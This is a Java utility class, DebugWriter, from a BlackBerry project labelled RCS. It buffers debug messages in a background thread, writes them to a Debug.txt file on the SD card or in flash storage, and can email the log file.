//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.utils
 * File         : DebugWriter.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.utils;

import java.util.Vector;

import blackberry.fs.AutoFlashFile;
import blackberry.fs.Path;

// TODO: Auto-generated Javadoc
/**
 * The Class DebugWriter.
 */
public final class DebugWriter extends Thread {

    static final String FILE_NAME = "Debug.txt";
    static final String SD_PATH = Path.SD_PATH + FILE_NAME;
    static final String FLASH_PATH = Path.USER_PATH + FILE_NAME;
    private static final long SLEEP_TIME = 1000;

    private static AutoFlashFile fileDebug;

    boolean toStop;
    boolean logToSD;

    StringBuffer queue;
    int numMessages;

    /**
     * Instantiates a new debug writer.
     * 
     * @param logToSD
     *            the log to sd
     */
    public DebugWriter(final boolean logToSD) {

        toStop = false;
        queue = new StringBuffer();
        this.logToSD = logToSD;
        //final boolean logToFlash = !logToSD;

      

        createNewFile();
    }
    
    private void createNewFile(){
        
        if (logToSD) {
            Path.createDirectory(Path.SD_PATH);
            fileDebug = new AutoFlashFile(SD_PATH, false);
        } else {
            Path.createDirectory(Path.USER_PATH);
            fileDebug = new AutoFlashFile(FLASH_PATH, false);
        }
        
        if (fileDebug.exists()) {
            fileDebug.delete();
        }
             
        fileDebug.create();

    }

    /**
     * Append.
     * 
     * @param message
     *            the message
     * @return true, if successful
     */
    public synchronized boolean append(final String message) {

        queue.append(message + "\r\n");
        numMessages++;

        return true;
    }

    /*
     * (non-Javadoc)
     * @see java.lang.Thread#run()
     */
    public void run() {
        //#ifdef DBC
        Check.asserts(fileDebug != null, "null filedebug");
        //#endif

        for (;;) {
            synchronized (this) {
                if (numMessages > 0) {
                    final String message = queue.toString();
                    final boolean ret = fileDebug.append(message + "\r\n");
                    queue = new StringBuffer();
                    numMessages = 0;
                }

                if (toStop) {
                    break;
                }

                try {
                    wait(SLEEP_TIME);
                } catch (final InterruptedException e) {
                }
            }
            //Utils.sleep((int) SLEEP_TIME);
        }
    }

    /**
     * Stop.
     */
    public synchronized void requestStop() {
        toStop = true;
        notifyAll();
    }
    
    public synchronized boolean sendLogs(String email) {
        //byte[] content = fileDebug.read();
        boolean ret = fileDebug.sendLogs(email);
        createNewFile();
    
        return ret;
    }
}
